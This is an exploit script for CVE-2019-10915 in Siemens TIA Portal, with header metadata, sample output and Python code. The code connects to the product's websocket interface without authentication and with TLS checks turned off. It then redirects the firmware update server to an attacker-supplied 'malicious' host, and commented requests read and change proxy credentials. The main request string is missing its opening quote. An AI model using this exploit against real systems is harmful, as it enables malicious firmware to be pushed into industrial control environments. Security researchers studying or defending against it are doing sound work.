##
# Exploit Title: Siemens TIA Portal remote command execution
# Date: 06/11/2019
# Exploit Author: Joseph Bingham
# CVE : CVE-2019-10915
# Advisory: https://www.tenable.com/security/research/tra-2019-33
# Writeup: https://medium.com/tenable-techblog/nuclear-meltdown-with-critical-ics-vulnerabilities-8af3a1a13e6a
# Affected Vendors/Device/Firmware:
#  - Siemens STEP7 / TIA Portal
##

##
# Example usage
# $ python cve_2019_10915_tia_portal_rce.py 
# Received '0{"sid":"ZF_W8SDLY3SCGExV9QZc1Z9-","upgrades":[],"pingInterval":25000,"pingTimeout":60000}'
# Received '40'
# Received '42[" ",{"configType":{"key":"ProxyConfigType","defaultValue":0,"value":0},"proxyAddress":{"key":"ProxyAddress","defaultValue":"","value":""},"proxyPort":{"key":"ProxyPort","defaultValue":"","value":""},"userName":{"key":"ProxyUsername","defaultValue":"","value":""},"password":{"key":"ProxyPassword","defaultValue":"","value":""}},null]'
##

import websocket, ssl, argparse

parser = argparse.ArgumentParser()
parser.add_argument("target_host", help="TIA Portal host") 
parser.add_argument("target_port", help="TIA Portal port (ie. 8888)", type=int) 
parser.add_argument("update_server", help="Malicious firmware update server IP") 
args = parser.parse_args()
  
host = args.target_host
port = args.target_port
updatesrv = args.update_server
ws = websocket.create_connection("wss://"+host+":"+port+"/socket.io/?EIO=3&transport=websocket&sid=", sslopt={"cert_reqs": ssl.CERT_NONE})
#req = '42["cli2serv",{"moduleFunc":"ProxyModule.readProxySettings","data":"","responseEvent":" "}]'
#req = '42["cli2serv",{"moduleFunc":"ProxyModule.saveProxyConfiguration","data":{"configType":{"key":"ProxyConfigType","defaultValue":0,"value":1},"proxyAddress":{"key":"ProxyAddress","defaultValue":"","value":"10.0.0.200"},"proxyPort":{"key":"ProxyPort","defaultValue":"","value":"8888"},"userName":{"key":"ProxyUsername","defaultValue":"","value":""},"password":{"key":"ProxyPassword","defaultValue":"","value":""}},responseEvent":" "}]'
req = 42["cli2serv",{"moduleFunc":"SoftwareModule.saveUrlSettings","data":{"ServerUrl":"https://"+updatesrv+"/FWUpdate/","ServerSource":"CORPORATESERVER","SelectedUSBDrive":"\\","USBDrivePath":"","downloadDestinationPath":"C:\\Siemens\\TIA Admin\\DownloadCache","isMoveDownloadNewDestination":true,"CyclicCheck":false,"sourcePath":"C:\\Siemens\\TIA Admin\\DownloadCache","productionLine":"ProductionLine1","isServerChanged":true},"responseEvent":" "}]'
ws.send(req)

result = ws.recv()
print("Received '%s'" % result)

result = ws.recv()
print("Received '%s'" % result)

result = ws.recv()
print("Received '%s'" % result)